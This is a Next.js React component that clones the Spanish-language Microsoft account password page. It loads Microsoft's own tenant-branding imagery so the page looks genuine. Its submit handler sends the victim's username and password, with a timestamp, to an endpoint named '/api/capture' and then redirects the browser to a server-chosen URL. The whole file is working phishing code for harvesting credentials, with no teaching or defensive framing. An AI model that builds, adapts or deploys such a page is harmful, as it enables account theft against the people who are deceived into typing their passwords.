"use client";

import Image from "next/image";
import Link from "next/link";
import React, { useContext, useEffect, useState } from "react";

import { FormContext, IFormStatus } from "./FormMicrosoft";

import templateStyle from "../template.module.css";
import styles from "./styles/template.module.css";
import ArrowIcon from "./images/arrow.svg";

function ErrorBox() {
  return (
    <div className={styles["form-error-text"]}>
      Escribe la contraseña de tu cuenta Microsoft.
    </div>
  );
}

export default function CompanyForm() {
  const formContext = useContext(FormContext);
  const username = formContext?.status.username || "";
  const [haveError, setError] = useState(false);

  useEffect(() => {
    const element = document.getElementsByClassName(
      templateStyle.container
    )[0] as HTMLDivElement;

    element.style.backgroundImage =
      'url("https://aadcdn.msftauthimages.net/dbd5a2dd-m4kaemlinfqvgxa7axamh0ynae0gxrq3la1rcqd1pb0/logintenantbranding/0/illustration?ts=637079522703712246")';
  }, []);

  function handleBack() {
    if (formContext) {
      const element = document.getElementsByClassName(
        templateStyle.container
      )[0] as HTMLDivElement;

      element.setAttribute("style", "");

      formContext.setFormStatus((prevState: IFormStatus) => {
        return {
          ...prevState,
          view: "email",
        };
      });
    }
  }

  function handleInput(event: React.FormEvent<HTMLInputElement>) {
    const input = event.target as HTMLInputElement;
    input.value ? setError(false) : setError(true);
  }

  async function handleSubmit(e: any) {
    e.preventDefault();

    const username: string | null = e.target.username.value;
    const password: string | null = e.target.password.value;

    if (!password || password === "") {
      setError(true);
      return;
    }

    if (username && password) {
      const req = await fetch("/api/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password, date: new Date() }),
      });

      const rep = await req.json();

      if (rep.status === "success") {
        window.location.replace(rep.redirect);
      } else {
        window.location.reload();
      }
    } else {
      window.location.reload();
    }
  }

  return (
    <div>
      <div className="mt-4 h-6 text-[15x]">
        <div
          title={username.toLocaleLowerCase()}
          className={styles["form-identity"]}
        >
          <button
            type="button"
            className={styles["form-btnBack"]}
            onClick={handleBack}
          >
            <Image width={24} height={24} src={ArrowIcon} alt="Icon Arrow" />
          </button>
          {username.toLocaleLowerCase()}
        </div>
      </div>
      <div className="flex flex-col gap-2">
        <form onSubmit={handleSubmit}>
          <h1 className={`${styles["form-title"]} mb-2`}>
            Escribir contraseña
          </h1>
          {haveError ? <ErrorBox /> : null}
          <div>
            <input
              aria-required="true"
              data-username
              autoComplete="username"
              type="hidden"
              name="username"
              placeholder="username"
              defaultValue={username}
            />
            <input
              aria-required="true"
              autoComplete="current-password"
              className={`${styles["form-inputPrimary"]} ${
                haveError && styles["form-error"]
              }`}
              type="password"
              name="password"
              onInput={handleInput}
              placeholder="Contraseña"
            />
          </div>
          <div className="text-[13px]">
            <Link className={styles["form-linkPrimary"]} href="#">
              He olvidado mi contraseña
            </Link>
          </div>
          <div className={styles["form-btnContainer"]}>
            <button
              onSubmit={handleSubmit}
              className={styles["form-btnPrimary"]}
              type="submit"
            >
              Iniciar sesión
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
